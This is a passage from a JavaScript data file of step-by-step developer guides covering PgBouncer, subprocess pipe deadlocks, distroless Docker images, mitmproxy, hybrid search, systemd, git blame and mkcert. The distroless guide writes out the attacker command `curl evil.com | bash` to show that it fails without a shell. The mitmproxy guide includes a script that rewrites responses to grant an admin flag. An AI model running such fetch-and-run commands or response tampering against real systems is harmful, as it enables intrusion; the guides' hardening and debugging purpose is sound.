        out: "Serverless functions spin up and down unpredictably, easily creating 2,000 simultaneous lambda instances. PgBouncer sits between your serverless workers and PostgreSQL:\n  • 2,000 serverless clients connect to PgBouncer\n  • PgBouncer multiplexes all transactions through only 20 real PostgreSQL connections\n  • Connections are returned to the pool the instant a transaction completes",
        note: "Transaction mode note: In transaction pooling mode, session-level features (e.g. `SET timezone` or prepared statements without names) are reset between queries. Most ORMs (Prisma, Drizzle) support PgBouncer with dedicated connection string flags."
      }
    ],
    fix: [
      { p: "FATAL: remaining connection slots are reserved for non-superuser connections", s: "Your connection limit is exceeded. Check what is holding connections open: `SELECT pid, state, query, age(clock_timestamp(), query_start) FROM pg_stat_activity WHERE state != 'idle';`. Kill zombies with `SELECT pg_terminate_backend(pid);`." },
      { p: "Prisma client throws P2024: Timed out fetching a new connection from the connection pool", s: "Increase Prisma connection_limit in the DATABASE_URL query string: `postgresql://user:pass@host/db?connection_limit=25&pool_timeout=10`." }
    ],
    next: ["postgres-connect", "redis-caching-layer", "zero-downtime-deployment"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: SUBPROCESSES & STREAMING IPC
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "subprocess-ipc-deadlocks",
    t: "Prevent OS pipe deadlocks when streaming child process stdout and stderr",
    g: "term",
    mins: 8,
    diff: "advanced",
    why: "You write a script to call ffmpeg, git, or an image optimizer via child process. On small files it works perfectly; on large files the script freezes forever. Operating system pipes have a 64KB kernel buffer — if the child process fills stdout while the parent waits on stderr, both freeze in a permanent deadlock.",
    need: ["Node.js or Python runtime"],
    steps: [
      {
        do: "Understand the operating system pipe buffer mechanism.",
        out: "When a parent process spawns a child, the OS kernel allocates an in-memory buffer (typically 64KB on Linux, 4KB on Windows) for stdout and stderr.\n\nIf the child writes 100KB of output:\n  1. The child writes 64KB into the pipe buffer\n  2. The pipe buffer becomes FULL\n  3. The OS BLOCKS the child process on its write() call until someone reads from the pipe!",
        note: "If your parent script is waiting for the child to exit before reading stdout, or if it reads stderr first while the child is blocked trying to write to stdout, BOTH processes are stuck waiting for each other. This is a classic OS mutual deadlock."
      },
      {
        do: "Look at the bug that causes the freeze in synchronous code.",
        out: "The Buggy Pattern:\n  // In Node.js or Python:\n  const res = execSync('generate_large_output'); // Buffers everything into memory synchronously\n\nOr in Python:\n  p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n  p.wait() # <--- DEADLOCK! Waiting for child to finish, but child is blocked waiting for buffer read!",
        note: "Never call `process.wait()` before consuming the stdout and stderr streams. The child CANNOT finish until its output buffer is drained."
      },
      {
        do: "The correct solution in Node.js: stream stdout and stderr concurrently with backpressure.",
        cmd: {
          win: "// In Node.js (save as runner.js):\nconst { spawn } = require('child_process');\n\nfunction runStreaming(cmd, args) {\n  return new Promise((resolve, reject) => {\n    const child = spawn(cmd, args);\n    \n    let stdoutData = '';\n    let stderrData = '';\n    \n    // Consume stdout as chunks arrive (prevents buffer filling up)\n    child.stdout.on('data', (chunk) => { stdoutData += chunk; });\n    \n    // Consume stderr concurrently\n    child.stderr.on('data', (chunk) => { stderrData += chunk; });\n    \n    child.on('close', (code) => {\n      if (code === 0) resolve(stdoutData);\n      else reject(new Error(`Exited with code ${code}: ${stderrData}`));\n    });\n    \n    child.on('error', reject);\n  });\n}",
          mac: "// Same Node.js streaming implementation"
        },
        out: "Asynchronous stream consumers attached: streams drain in real time without buffer saturation.",
        note: "By attaching `.on('data')` handlers immediately after spawn, data is constantly pulled out of the OS pipe buffer into Node.js userspace memory, so the OS buffer never fills up and the child never blocks."
      },
      {
        do: "The correct solution in Python: use communicate() instead of wait().",
        cmd: {
          win: "# In Python:\nimport subprocess\n\n# Popen starts the child process asynchronously:\nproc = subprocess.Popen(\n    ['git', 'log', '-p'],\n    stdout=subprocess.PIPE,\n    stderr=subprocess.PIPE,\n    text=True\n)\n\n# communicate() automatically reads stdout and stderr in background threads:\nstdout_data, stderr_data = proc.communicate()\n# Safe: communicate() guarantees streams are drained before waiting for process exit",
          mac: "# Same Python subprocess code"
        },
        out: "communicate() safely reads both streams concurrently and returns (stdout, stderr).",
        note: "Python's `proc.communicate()` spawns background worker threads internally to read stdout and stderr simultaneously, ensuring neither stream buffer ever overflows."
      },
      {
        do: "Test your stream handler with 50MB of simulated random data.",
        cmd: {
          win: "# Test with a large generation script:\nnode -e \"const { spawn } = require('child_process'); const p = spawn('node', ['-e', 'for(let i=0;i<100000;i++) console.log(`LINE ${i} ` + `x`.repeat(100))']); p.stdout.on('data', d => {}); p.on('close', c => console.log('Finished cleanly with code', c));\"",
          mac: "node -e \"const { spawn } = require('child_process'); const p = spawn('node', ['-e', 'for(let i=0;i<100000;i++) console.log(`LINE ${i} ` + `x`.repeat(100))']); p.stdout.on('data', d => {}); p.on('close', c => console.log('Finished cleanly with code', c));\""
        },
        out: "Finished cleanly with code 0",
        note: "Generates 100,000 lines (~10MB) through the pipe. It finishes in under 200ms with zero memory pressure or freezing."
      }
    ],
    fix: [
      { p: "RangeError [ERR_CHILD_PROCESS_STDIO_MAXBUFFER]: maxBuffer length exceeded", s: "You used `exec()` which defaults to a 1MB buffer limit. Either increase `maxBuffer: 50 * 1024 * 1024` or switch to `spawn()` which streams with no size limit." },
      { p: "Child process terminates with SIGPIPE (exit code 141)", s: "The parent closed its read end of the pipe while the child was still writing. Handle `child.stdin.end()` properly and do not abort the stream prematurely." }
    ],
    next: ["pipe-commands", "kill-process", "xargs-parallel-processing"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: CONTAINER SECURITY & DISTROLESS
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "docker-distroless-security",
    t: "Build ultra-secure, tiny container images with Google Distroless and Scratch",
    g: "container",
    mins: 7,
    diff: "advanced",
    why: "Standard Docker images contain full Linux distributions with bash, curl, apt, and hundreds of vulnerable packages. If an attacker discovers an arbitrary code execution bug in your app, they have a full Linux shell. Google Distroless images contain ONLY your application and runtime — zero shells, zero package managers, near-zero attack surface.",
    need: ["Docker installed on your system"],
    steps: [
      {
        do: "Understand the security vulnerability of standard base images (ubuntu, alpine, debian).",
        out: "A standard `node:20` image is over 1GB and contains:\n  • A full bash shell (/bin/bash, /bin/sh)\n  • Package managers (apt, dpkg) allowing attackers to install malware\n  • Network utilities (curl, wget) allowing attackers to exfiltrate database records\n  • Over 80 known CVE vulnerabilities in system packages you never use",
        note: "Your application only needs the Node or Python binary and your code. It does NOT need bash, apt, or curl in production. Google Distroless strips everything except the runtime and CA certificates."
      },
      {
        do: "Write a production multi-stage Dockerfile targeting Google Distroless.",
        cmd: {
          win: "# Create Dockerfile for a Node.js app:\n# Stage 1: Build stage (heavyweight image with npm/compilers)\nFROM node:20-bookworm-slim AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --omit=dev\nCOPY . .\n\n# Stage 2: Production runtime (distroless - no shell, no npm, 50MB total)\nFROM gcr.io/distroless/nodejs20-debian12\nWORKDIR /app\nCOPY --from=builder /app /app\nUSER nonroot:nonroot\nEXPOSE 3000\nCMD [\"server.js\"]",
          mac: "# Same multi-stage Distroless Dockerfile"
        },
        out: "Dockerfile created using gcr.io/distroless/nodejs20-debian12 base.",
        note: "Notice two crucial security details:\n  1. `USER nonroot:nonroot`: The container runs as an unprivileged user (UID 65532), not root!\n  2. `CMD [\"server.js\"]`: Arguments must be passed as a JSON array because there is NO shell to interpret shell strings."
      },
      {
        do: "Build the image and observe the drastically reduced size.",
        cmd: {
          win: "docker build -t my-secure-app:distroless .\n# Check the image size comparison:\ndocker images my-secure-app:distroless",
          mac: "docker build -t my-secure-app:distroless .\ndocker images my-secure-app:distroless"
        },
        out: "REPOSITORY          TAG          SIZE\nmy-secure-app       distroless   128MB  (compared to 1.1GB for standard node)",
        note: "The image size shrinks by ~85%, cutting container registry storage costs and speeding up deployment pull times to Kubernetes / AWS ECS by 5x."
      },
      {
        do: "Try to exec into the distroless container — witness complete shell lockout.",
        cmd: {
          win: "# Start the container:\ndocker run -d -p 3000:3000 --name test-distroless my-secure-app:distroless\n# Try to get a shell inside the container:\ndocker exec -it test-distroless /bin/sh",
          mac: "docker run -d -p 3000:3000 --name test-distroless my-secure-app:distroless\ndocker exec -it test-distroless /bin/sh"
        },
        out: "OCI runtime exec failed: exec failed: unable to start container process: exec: \"/bin/sh\": stat /bin/sh: no such file or directory",
        note: "There is NO shell. If an attacker finds a remote command injection vulnerability in your web application, any attempt to run `sh -c 'curl evil.com | bash'` fails instantly because neither `sh` nor `curl` exist on the disk."
      },
      {
        do: "Clean up the test container when finished.",
        cmd: {
          win: "docker stop test-distroless; docker rm test-distroless",
          mac: "docker stop test-distroless && docker rm test-distroless"
        },
        out: "test-distroless stopped and removed.",
        note: "For compiled languages (Go, Rust, C++), you can use the `scratch` base image (0 bytes!) to create complete self-contained containers under 15MB with zero OS dependencies."
      }
    ],
    fix: [
      { p: "Error: Cannot find module '/app/server.js'", s: "Distroless has no shell to resolve relative paths. Use absolute WORKDIR and specify the entrypoint file accurately in CMD." },
      { p: "Permission denied when writing temporary files in container", s: "The container runs as nonroot user. If your app writes files (e.g. uploads), ensure the target folder is chowned to nonroot: `RUN chown -R 65532:65532 /app/uploads` in builder stage." }
    ],
    next: ["docker-multistage-build", "dockerfile-write", "docker-exec-into-running-container"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: HTTPS & NETWORK INTERCEPTION
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "mitmproxy-api-reverse-engineer",
    t: "Inspect and modify desktop and mobile app traffic with mitmproxy",
    g: "web",
    mins: 8,
    diff: "advanced",
    why: "Browser DevTools only reveal traffic inside web browsers. What if you want to inspect API calls from a desktop app (Slack, Spotify), an iOS/Android mobile app, or a closed-source CLI tool? mitmproxy is an interactive HTTPS interception proxy that decrypts, inspects, and modifies network packets in real time.",
    need: ["mitmproxy installed (`winget install mitmproxy` or `brew install mitmproxy`)"],
    steps: [
      {
        do: "Understand how Man-in-the-Middle (MITM) HTTPS interception works.",
        out: "HTTPS encrypts traffic with TLS certificates. Under normal conditions, an intermediary proxy cannot read the encrypted bytes.\n\nmitmproxy solves this by generating custom on-the-fly SSL certificates for every website your apps connect to, signed by a custom local Certificate Authority (CA) that you install into your machine's trust store.",
        note: "This allows full legal interception and decryption of all traffic originating from your own laptop or phone for debugging and security auditing purposes."
      },
      {
        do: "Start mitmproxy with its visual web interface (mitmweb).",
        cmd: {
          win: "# Start the mitmweb proxy on default port 8080 with web UI on 8081:\nmitmweb --web-port 8081\n# In browser: open http://localhost:8081",
          mac: "mitmweb --web-port 8081\n# Open http://localhost:8081 in browser"
        },
        out: "Web server listening at http://127.0.0.1:8081/\nProxy server listening at http://*:8080",
        note: "mitmweb gives you a full browser-based inspection UI (like DevTools Network tab) showing all live HTTP/HTTPS flows across your entire operating system."
      },
      {
        do: "Install the mitmproxy Root CA Certificate into your system trust store.",
        cmd: {
          win: "# With mitmweb running, configure your browser or Windows proxy to 127.0.0.1:8080\n# Then visit: http://mitm.it in your browser\n# Click 'Windows' to download the certificate\n# Double-click the .p12 or .cer file -> Install Certificate -> Place in 'Trusted Root Certification Authorities'",
          mac: "# Configure proxy to 127.0.0.1:8080\n# Visit http://mitm.it -> click 'Apple' -> Open Keychain Access -> set certificate to 'Always Trust'"
        },
        out: "mitmproxy root certificate trusted by the operating system.",
        note: "Without trusting the CA certificate, your operating system and browsers will display scary 'SSL Certificate Untrusted' warnings and block connections. Once trusted, HTTPS traffic flows transparently."
      },
      {
        do: "Route specific application traffic through the proxy.",
        cmd: {
          win: "# Route a specific curl command through mitmproxy to inspect it:\ncurl.exe --proxy http://127.0.0.1:8080 https://httpbin.org/json\n\n# Or configure an entire CLI session with environment variables:\n$env:HTTP_PROXY=\"http://127.0.0.1:8080\"\n$env:HTTPS_PROXY=\"http://127.0.0.1:8080\"",
          mac: "curl --proxy http://127.0.0.1:8080 https://httpbin.org/json\nexport HTTP_PROXY=\"http://127.0.0.1:8080\"\nexport HTTPS_PROXY=\"http://127.0.0.1:8080\""
        },
        out: "The HTTP request and full JSON response immediately appear in your mitmweb dashboard on http://localhost:8081.",
        note: "Click on any flow in mitmweb to see request headers, cookies, query parameters, raw body bytes, and response status. You can edit the request and re-send it with one click."
      },
      {
        do: "Write a python addon script to automatically modify responses on the fly.",
        cmd: {
          win: "# Create modify.py to mock or alter responses dynamically:\n@\"\ndef response(flow):\n    if \"api/user\" in flow.request.pretty_url:\n        flow.response.text = flow.response.text.replace('\"is_admin\": false', '\"is_admin\": true')\n        print(\"Successfully injected admin flag into API response!\")\n\"@ | Out-File -Encoding ascii modify.py\n\n# Run mitmweb with the addon script:\nmitmweb -s modify.py",
          mac: "# Create modify.py and run: mitmweb -s modify.py"
        },
        out: "Addon script loaded. Every matching API response is intercepted and rewritten before reaching the client.",
        note: "This technique allows frontend developers to test edge cases (e.g. server returning 500 error, VIP user status, empty arrays) without changing a single line of backend code."
      }
    ],
    fix: [
      { p: "SEC_ERROR_UNKNOWN_ISSUER or SSL certificate verification failed", s: "The application uses certificate pinning (common in banking apps and mobile games) or the mitmproxy CA was not installed into the machine's Trusted Root store. For CLI tools, pass `--cacert ~/.mitmproxy/mitmproxy-ca-cert.pem`." },
      { p: "Internet stops working when I close mitmproxy", s: "Remember to turn off your system or browser proxy settings (Settings -> Network & Internet -> Proxy -> Turn off 'Use a proxy server') after you stop mitmproxy." }
    ],
    next: ["network-sniffing-wireshark-tcpdump", "curl-request", "read-devtools"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: AI & RETRIEVAL ENGINEERING
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "hybrid-search-rrf-rag",
    t: "Build hybrid search combining BM25 keyword matching with vector embeddings",
    g: "ai",
    mins: 8,
    diff: "advanced",
    why: "Pure vector search frequently fails on exact keywords, product SKUs, error codes, and version numbers (e.g. 'error code 0x80070005' or 'iPhone 15 Pro Max 256GB'). Pure keyword search fails on conceptual meaning. Hybrid search combines BM25 and vector embeddings using Reciprocal Rank Fusion (RRF) for 98%+ retrieval accuracy in production RAG systems.",
    need: ["An AI RAG pipeline or search service"],
    steps: [
      {
        do: "Understand why pure vector search fails on exact keywords.",
        out: "Vector embeddings compress entire passages into a 1536-dimensional coordinate. Semantic concepts (e.g. 'happy', 'joyful') map close together.\n\nHowever, exact character sequences like 'CVE-2024-38077' or 'part #8834-A' do NOT have distinct semantic embeddings — they cluster vaguely near other technical words.\n\nA user searching for a specific product ID will get irrelevant results with pure vector search!",
        note: "The solution used by leading AI teams: run TWO searches simultaneously — BM25 (lexical exact match) AND Vector (semantic concept match) — then fuse the ranked lists."
      },
      {
        do: "Understand the BM25 algorithm (Best Matching 25).",
        out: "BM25 is the industry-standard probabilistic ranking function:\n  • Term Frequency (TF): how often the search term appears in the document\n  • Inverse Document Frequency (IDF): penalizes common words (like 'the', 'is') and heavily rewards rare terms (like 'CVE-2024-38077')\n  • Document Length Normalization: prevents long rambling documents from scoring higher simply because they have more words",
        note: "BM25 guarantees that if a user searches for an exact serial number, any document containing that exact serial number gets a massive score boost."
      },
      {
        do: "Understand Reciprocal Rank Fusion (RRF): the secret to combining two different scoring systems.",
        out: "Vector scores range from 0.0 to 1.0 (cosine similarity). BM25 scores range from 0 to 45+ (unbounded log probabilities). You CANNOT simply add them together!\n\nReciprocal Rank Fusion (RRF) solves this by looking ONLY AT THE RANK (position in list), not the raw score:\n  RRF_Score(d) = Σ [ 1 / (k + rank(d)) ]\n  where k is a constant (typically 60).",
        note: "Why RRF is magical: if a document is ranked #1 in BM25 and #2 in Vector search, its RRF score is: (1 / (60 + 1)) + (1 / (60 + 2)) = 0.01639 + 0.01612 = 0.03251. Documents that appear near the top of BOTH lists rise to the very top, while outliers from either system are naturally moderated."
      },
      {
        do: "Implement Reciprocal Rank Fusion in Python or JavaScript.",
        cmd: {
          win: "// In JavaScript (hybridSearch.js):\nfunction reciprocalRankFusion(vectorResults, bm25Results, k = 60) {\n  const scores = new Map();\n  \n  // Process vector results ranking\n  vectorResults.forEach((doc, rank) => {\n    const rrf = 1 / (k + (rank + 1));\n    scores.set(doc.id, (scores.get(doc.id) || 0) + rrf);\n  });\n  \n  // Process BM25 results ranking\n  bm25Results.forEach((doc, rank) => {\n    const rrf = 1 / (k + (rank + 1));\n    scores.set(doc.id, (scores.get(doc.id) || 0) + rrf);\n  });\n  \n  // Sort all documents by combined RRF score descending\n  return Array.from(scores.entries())\n    .sort((a, b) => b[1] - a[1])\n    .map(([id, score]) => ({ id, rrfScore: score }));\n}",
          mac: "// Same RRF implementation"
        },
        out: "RRF function defined: merges arbitrary search lists without score calibration.",
        note: "Notice that RRF works across 2, 3, or even 4 different search engines simultaneously. You can fuse BM25 + Dense Vectors + Sparse SPLADE vectors + PageRank into one unified ranking list."
      },
      {
        do: "Optional: Apply a Cross-Encoder Re-ranker on the top 20 candidates.",
        cmd: {
          win: "# Python re-ranking with sentence-transformers:\n# from sentence_transformers import CrossEncoder\n# reranker = CrossEncoder('cross-encoder/ms-marco-MiniLM-L-6-v2')\n# pairs = [[user_query, doc.text] for doc in top_20_rrf_docs]\n# scores = reranker.predict(pairs)",
          mac: "# CrossEncoder re-ranking snippet"
        },
        out: "Final top 5 documents sorted by deep cross-attention semantic relevance.",
        note: "Bi-encoders (embeddings) encode query and document independently. Cross-encoders attend to query AND document simultaneously, achieving human-level relevance scoring for the final top 5 passages fed into your LLM."
      }
    ],
    fix: [
      { p: "Hybrid search latency is double the vector search latency", s: "Execute the BM25 query and vector search in PARALLEL using `Promise.all([searchVector(), searchBM25()])` or `asyncio.gather()`. Both finish concurrently in ~30ms." },
      { p: "Vector databases that do not support BM25 natively", s: "Qdrant, Pinecone, and Weaviate now support sparse-dense hybrid search natively. If using pure pgvector, pair it with PostgreSQL's built-in `tsvector` and `websearch_to_tsquery()` full-text search." }
    ],
    next: ["rag-pipeline", "embeddings-search", "vector-db-pinecone-qdrant"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: DAEMON & PROCESS LIFECYCLE
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "linux-systemd-service-mastery",
    t: "Turn any script or binary into a self-healing background systemd daemon",
    g: "ship",
    mins: 8,
    diff: "intermediate",
    why: "Running server apps with `nohup python app.py &` is amateur — if the server reboots, the app dies; if it crashes at 3am, nobody restarts it. systemd is the standard Linux service manager that automatically restarts crashed processes, streams structured logs to journald, enforces memory limits, and boots on startup.",
    need: ["Linux server or VPS (Ubuntu, Debian, CentOS, Arch)"],
    steps: [
      {
        do: "Understand why systemd is better than screen, nohup, or background jobs.",
        out: "systemd features:\n  • Automatic restart on crash with configurable delay (`Restart=always`)\n  • Auto-boot on machine startup (`WantedBy=multi-user.target`)\n  • Runs as a secure dedicated unprivileged user (`User=appuser`)\n  • Native log capture (stdout/stderr piped automatically to `journald`)\n  • Hard memory and CPU limits (`MemoryMax=1G` to prevent server lockups)",
        note: "systemd has been the standard init system on all major Linux distributions since 2015. Every production service on Linux should be a systemd unit."
      },
      {
        do: "Create a systemd unit file at /etc/systemd/system/myapp.service.",
        cmd: {
          win: "# On your Linux server (or in WSL):\nsudo nano /etc/systemd/system/myapp.service\n\n# Paste this complete service configuration:\n[Unit]\nDescription=My Production Node.js API Service\nAfter=network.target postgresql.service\n\n[Service]\nType=simple\nUser=www-data\nWorkingDirectory=/var/www/myapp\nExecStart=/usr/bin/node /var/www/myapp/server.js\nRestart=always\nRestartSec=5s\nEnvironment=NODE_ENV=production PORT=3000\nEnvironmentFile=/var/www/myapp/.env\nLimitNOFILE=65535\nMemoryMax=1G\n\n[Install]\nWantedBy=multi-user.target",
          mac: "# Create /etc/systemd/system/myapp.service on Linux"
        },
        out: "Service definition file saved.",
        note: "Breakdown of critical directives:\n  • `After=network.target postgresql.service`: Wait until the network and database are UP before starting your app\n  • `Restart=always`: If the process crashes or gets killed, systemd revives it 5 seconds later\n  • `LimitNOFILE=65535`: Raises the open file descriptor limit so your server can handle 10,000 concurrent sockets"
      },
      {
        do: "Reload the systemd daemon to register your new service.",
        cmd: {
          win: "sudo systemctl daemon-reload",
          mac: "sudo systemctl daemon-reload"
        },
        out: "systemd configuration reloaded.",
        note: "Any time you modify a `.service` file on disk, you MUST run `daemon-reload` so systemd re-reads the updated file into memory."
      },
      {
        do: "Enable the service to start automatically on reboot, and start it immediately.",
        cmd: {
          win: "sudo systemctl enable --now myapp.service\n# enable = start on machine boot\n# --now  = also start it RIGHT NOW",
          mac: "sudo systemctl enable --now myapp.service"
        },
        out: "Created symlink /etc/systemd/system/multi-user.target.wants/myapp.service -> /etc/systemd/system/myapp.service.",
        note: "Your application is now running as a permanent background daemon. If the virtual machine reboots for security updates, systemd boots your service automatically."
      },
      {
        do: "Check the status and inspect live streaming logs with journalctl.",
        cmd: {
          win: "# Check status:\nsudo systemctl status myapp.service\n\n# Stream live logs in real time (like tail -f):\nsudo journalctl -u myapp.service -f -o cat",
          mac: "sudo systemctl status myapp.service\nsudo journalctl -u myapp.service -f -o cat"
        },
        out: "● myapp.service - My Production Node.js API Service\n   Loaded: loaded (/etc/systemd/system/myapp.service; enabled)\n   Active: active (running) since Mon 2026-09-07 14:00:00 UTC\n Main PID: 42100 (node)\n   Memory: 64.2M (max: 1.0G)\n   CGroup: /system.slice/myapp.service\n           └─42100 /usr/bin/node /var/www/myapp/server.js",
        note: "journalctl captures everything your app writes to `console.log()` or `print()`. Add `--since '1 hour ago'` or `-p err` (errors only) to filter logs instantly without needing custom file loggers."
      }
    ],
    fix: [
      { p: "Service enters 'crash loop' or status shows 'failed (Result: exit-code)'", s: "Run `journalctl -u myapp.service -n 50 --no-pager` to see the exact crash stack trace. Common issue: the User specified does not have read permissions to the project directory or .env file." },
      { p: "Environment variables in .env file not loading", s: "Ensure the path in `EnvironmentFile=/path/to/.env` is an ABSOLUTE path. Relative paths fail in systemd unit files." }
    ],
    next: ["pm2-process-manager", "zero-downtime-deployment", "cron-jobs-scheduled-tasks"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: GIT REPO HYGIENE
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "git-blame-ignore-revs",
    t: "Keep git blame useful forever by ignoring mass reformatting and lint commits",
    g: "git",
    mins: 6,
    diff: "intermediate",
    why: "A teammate runs Prettier or a code linter across 400 files. Now `git blame` attributes EVERY line in the entire repository to that single formatting commit, destroying years of original authorship and git history. `.git-blame-ignore-revs` teaches Git to look straight through formatting commits.",
    need: ["Git installed"],
    steps: [
      {
        do: "Understand the disaster caused by repository-wide formatting commits.",
        out: "You run `git blame src/auth.js` to see WHO wrote a critical cryptographic check and WHY.\nInstead of showing 'Alice, 3 years ago, commit 8f2b1c: Fix session hijacking bug', git blame shows:\n'Bob, yesterday, commit 112233: Run prettier on all files'.\n\nAll historical context is permanently obscured behind the formatting commit.",
        note: "Git 2.23+ introduced `--ignore-rev` and `blame.ignoreRevsFile` specifically to solve this problem. It allows Git to pretend formatting commits never touched those lines."
      },
      {
        do: "Find the exact commit hash of the mass reformatting commit.",
        cmd: {
          win: "git log --oneline -5\n# Look for the commit that reformatted code:\n# e.g., a1b2c3d4 chore: format entire codebase with prettier",
          mac: "git log --oneline -5"
        },
        out: "a1b2c3d4 chore: format entire codebase with prettier\n8f2b1c4e feat: add session authentication\n...",
        note: "Copy the full 40-character commit hash using `git rev-parse a1b2c3d4`."
      },
      {
        do: "Create a .git-blame-ignore-revs file in the root of your repository.",
        cmd: {
          win: "# In PowerShell:\n@\"\n# Ignore mass reformatting commit\na1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\n\"@ | Out-File -Encoding ascii .git-blame-ignore-revs",
          mac: "echo '# Ignore mass reformatting commit' >> .git-blame-ignore-revs\necho 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2' >> .git-blame-ignore-revs"
        },
        out: "File .git-blame-ignore-revs created at repository root.",
        note: "You can add comments starting with `#` and list multiple commit hashes, one per line. Commit this file to your git repository so the whole team shares the list."
      },
      {
        do: "Configure Git locally to automatically read this ignore file.",
        cmd: {
          win: "git config blame.ignoreRevsFile .git-blame-ignore-revs",
          mac: "git config blame.ignoreRevsFile .git-blame-ignore-revs"
        },
        out: "Git configuration updated: blame.ignoreRevsFile is set.",
        note: "Now every time you run `git blame` in your terminal or view blame in VS Code, Git automatically skips past the formatting commit and shows the real author who wrote the logic!"
      },
      {
        do: "GitHub integration: GitHub natively honors .git-blame-ignore-revs automatically!",
        out: "When you push `.git-blame-ignore-revs` to GitHub, GitHub's web interface automatically detects the file and skips those commits in its online blame viewer with zero configuration required!",
        note: "A button appears on GitHub: 'Blame prior to this commit'. Your entire team gets pristine, meaningful blame history in both their local editors and on GitHub pull requests."
      }
    ],
    fix: [
      { p: "fatal: could not read .git-blame-ignore-revs: No such file or directory", s: "Run `git config blame.ignoreRevsFile .git-blame-ignore-revs` from the repository root, or specify the relative path from the repo root." },
      { p: "A commit hash in .git-blame-ignore-revs is invalid or was rebased away", s: "If you squashed or rebased the formatting commit, its hash changed. Update the file with the new hash." }
    ],
    next: ["diff-before-commit", "format-lint", "git-reflog-undo-anything"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: LOCAL HTTPS & VALID CERTIFICATES
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "mkcert-local-https-trusted",
    t: "Run localhost with 100% valid, green-padlock SSL certificates using mkcert",
    g: "web",
    mins: 6,
    diff: "beginner",
    why: "Modern browser APIs — WebCrypto, Service Workers, Geolocation, HTTP/2, and secure cookies (`SameSite=None; Secure`) — refuse to work over plain HTTP. Self-signed OpenSSL certificates produce scary red browser warning screens and break mobile device testing. mkcert creates a trusted local Certificate Authority that gives you authentic zero-warning HTTPS on localhost.",
    need: ["mkcert installed (`winget install FiloSottile.mkcert` or `brew install mkcert`)"],
    steps: [
      {
        do: "Understand why self-signed OpenSSL certificates produce browser warnings.",
        out: "Browsers trust certificates ONLY if they are signed by a Certificate Authority (CA) in the operating system's trusted root store.\n\nWhen you generate a certificate with `openssl req -x509`, your OS does NOT trust your computer as a CA, so Chrome displays:\n'Your connection is not private (NET::ERR_CERT_AUTHORITY_INVALID)'\nand blocks subresource API calls.",
        note: "mkcert solves this elegantly: it creates your own personal local Certificate Authority ONCE, registers it in your OS and Firefox trust stores, and then issues valid local certificates on demand."
      },
      {
        do: "Install the local Certificate Authority into your system trust store.",
        cmd: {
          win: "# Run in PowerShell or Command Prompt:\nmkcert -install",
          mac: "mkcert -install"
        },
        out: "The local CA is now installed in the system trust store! ⚡️\nThe local CA is now installed in the Firefox trust store (if applicable).",
        note: "You only ever run `mkcert -install` ONCE per computer. It generates private root keys stored safely in your user app data directory."
      },
      {
        do: "Generate trusted certificates for localhost and any custom local domains.",
        cmd: {
          win: "# Generate certificates for localhost, 127.0.0.1, and your local machine IP:\nmkcert localhost 127.0.0.1 ::1 myapp.local",
          mac: "mkcert localhost 127.0.0.1 ::1 myapp.local"
        },
        out: "Created a new certificate valid for the following names:\n - \"localhost\"\n - \"127.0.0.1\"\n - \"::1\"\n - \"myapp.local\"\n\nThe certificate is at \"./localhost+3.pem\" and the key at \"./localhost+3-key.pem\".",
        note: "You now have two files:\n  • `localhost+3.pem`: The public SSL certificate\n  • `localhost+3-key.pem`: The private key\nBoth are signed by your trusted local CA."
      },
      {
        do: "Use the certificates in your local Node.js / Express or Vite server.",
        cmd: {
          win: "// In your Node.js HTTPS server:\nconst https = require('https');\nconst fs = require('fs');\nconst express = require('express');\n\nconst app = express();\napp.get('/', (req, res) => res.send('Secure localhost!'));\n\nconst options = {\n  key: fs.readFileSync('./localhost+3-key.pem'),\n  cert: fs.readFileSync('./localhost+3.pem')\n};\n\nhttps.createServer(options, app).listen(3443, () => {\n  console.log('HTTPS running on https://localhost:3443');\n});",
          mac: "// Same Node.js HTTPS server code"
        },
        out: "HTTPS server listening on https://localhost:3443",
        note: "For Vite: simply configure `server: { https: { key: './localhost+3-key.pem', cert: './localhost+3.pem' } }` in your `vite.config.ts`."
      },
      {
        do: "Open the site in your browser — see the authentic green padlock with zero warnings.",
        out: "Navigate to https://localhost:3443 in Chrome, Firefox, or Edge.\n  • Padlock is secure and green\n  • No warning screens\n  • Service Workers, WebCrypto, and secure cookies work seamlessly\n  • HTTP/2 is enabled automatically",
        note: "You can also install the root CA on your mobile phone (AirDrop or email the root CA from `mkcert -CAROOT`) to test native mobile apps against your laptop's local HTTPS dev server!"
      }
    ],
    fix: [
      { p: "mkcert: command not found", s: "Install mkcert using your package manager: `winget install FiloSottile.mkcert` on Windows, or `brew install mkcert` on macOS, or `sudo apt install libnss3-tools && brew install mkcert` on Linux." },
      { p: "Chrome still shows warning after creating certificates", s: "Restart Chrome completely to reload the OS certificate trust store. In Chrome address bar, type `chrome://restart` and press Enter." }
    ],
    next: ["local-https-mkcert", "nginx-reverse-proxy", "ssh-keys"]
  },

  /* ═══════════════════════════════════════════════════════════════════════
     HACK CATEGORY: LOG ANALYSIS PIPELINES
     ═══════════════════════════════════════════════════════════════════════ */

  {
    id: "cut-sort-uniq-log-pipelines",
    t: "Analyze gigabyte-sized log files with cut, sort, and uniq pipelines",
    g: "data",
    mins: 7,
    diff: "intermediate",
    why: "Your production server is returning 500 errors and your 10GB access log is way too large to open in VS Code. Chaining `cut`, `sort`, and `uniq -c` in a streaming Unix pipeline lets you find top error endpoints, malicious IP addresses, and traffic spikes in 2 seconds without loading the file into RAM.",
    need: ["Terminal (PowerShell, Bash, or Zsh)"],
    steps: [
      {
